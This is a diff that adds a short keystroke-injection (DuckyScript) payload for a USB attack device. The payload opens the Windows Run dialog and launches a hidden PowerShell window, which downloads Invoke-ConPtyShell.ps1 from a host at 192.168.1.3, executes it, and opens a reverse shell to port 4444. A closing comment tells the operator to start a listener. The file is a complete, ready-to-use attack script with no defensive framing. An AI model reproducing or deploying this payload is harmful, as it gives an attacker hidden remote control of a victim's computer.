@@ -1,0 +1,8 @@
+REM Reverse shell via PowerShell and Invoke-ConPtyShell.ps1
+
+DELAY 1000
+WINDOWS R
+DELAY 1000
+STRING powershell -windowstyle hidden -command "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.1.3 4444"
+ENTER
+REM Ensure your IP and port are correct, and a listener is running
